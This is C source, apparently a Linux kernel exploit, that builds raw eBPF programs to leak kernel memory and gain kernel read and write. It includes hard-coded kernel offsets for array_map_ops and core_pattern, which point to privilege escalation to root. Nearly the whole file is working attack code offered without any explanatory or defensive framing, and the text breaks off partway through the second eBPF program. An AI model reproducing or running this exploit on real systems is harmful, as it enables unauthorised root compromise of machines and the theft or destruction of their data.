#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <err.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <sys/sendfile.h>
#include <linux/membarrier.h>
#include "io_uring.h"

#define STATIC_KBASE 0xffffffff81000000
#define array_map_ops (0xffffffff82c40200 - STATIC_KBASE)
#define core_pattern_off (0xffffffff83db6560 - STATIC_KBASE)

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif
#define SYSCHK(x)                     \
	({                                \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
			err(1, "SYSCHK(" #x ")"); \
		__res;                        \
	})

#define PAUSE           \
	{                   \
		printf(":");    \
		int x;          \
		read(0, &x, 1); \
	}

#define BPF_F_MMAPABLE 1024
#define BPF_FUNC_ringbuf_query 134
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_MAP_TYPE_RINGBUF 27
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_output 130

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){.code = CODE,           \
					   .dst_reg = DST,         \
					   .src_reg = SRC,         \
					   .off = OFF,             \
					   .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                   \
	((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, \
					   .dst_reg = DST,                    \
					   .src_reg = SRC,                    \
					   .off = 0,                          \
					   .imm = (__u32)(IMM)}),             \
		((struct bpf_insn){.code = 0,                     \
						   .dst_reg = 0,                  \
						   .src_reg = 0,                  \
						   .off = 0,                      \
						   .imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) \
	BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) \
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
	BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
	BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
	BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_LD_ABS(SIZE, IMM)                                     \
	((struct bpf_insn){.code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
					   .dst_reg = 0,                              \
					   .src_reg = 0,                              \
					   .off = 0,                                  \
					   .imm = IMM})

#define BPF_MAP_GET(idx, dst)                                   \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                        \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                   \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                  \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                 \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,               \
					 BPF_FUNC_map_lookup_elem),                 \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(), \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                 \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                              \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                        \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                   \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                  \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                 \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,               \
					 BPF_FUNC_map_lookup_elem),                 \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(), \
		BPF_MOV64_REG((dst), BPF_REG_0), BPF_MOV64_IMM(BPF_REG_0, 0)

#define LOG_BUF_SIZE 65536

#define BPF_HEAVY_JOB                             \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),          \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),      \
		BPF_MOV64_IMM(BPF_REG_3, 0x10000000),     \
		BPF_MOV64_IMM(BPF_REG_4, 0x0),            \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, \
					 BPF_FUNC_ringbuf_output)

#define INST(x) (sizeof(x) / sizeof(struct bpf_insn))
char log_buf[0x1000];
char buf[0x10000];
char magic[0x10000];
size_t target = 0x100;

struct timespec ts[0x80][0x1000];

struct bpf_insn array_map_leak_prog[] = {
	BPF_MOV64_IMM(BPF_REG_6, 0),
	BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

	BPF_LD_MAP_FD(BPF_REG_9, 0x100),
	BPF_MAP_GET_ADDR(0, BPF_REG_5),

	BPF_MOV64_IMM(BPF_REG_6, 0),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_6),

	BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0xCAFE),
	BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0xBACA),
	BPF_LD_MAP_FD(BPF_REG_9, 0x101),
	BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_9, -24),
	BPF_MOV64_REG(BPF_REG_5, BPF_REG_10),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, -8),
	BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -32),

	BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
	BPF_MOV64_IMM(BPF_REG_2, 0),
	BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -40),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
	BPF_MOV64_IMM(BPF_REG_5, 1),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

	BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_10, -32),
	BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_5, 0),
	BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, -8),
	BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0xBACA, 12),
	BPF_LD_MAP_FD(BPF_REG_9, 0x101),
	BPF_MAP_GET_ADDR(1, BPF_REG_8),
	BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),

};

struct bpf_insn kernel_read_write_prog[] = {
	BPF_MOV64_IMM(BPF_REG_6, 0),
	BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

	BPF_LD_MAP_FD(BPF_REG_9, 0x100),
	BPF_MAP_GET_ADDR(0, BPF_REG_5),

	BPF_MOV64_IMM(BPF_REG_6, 0),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
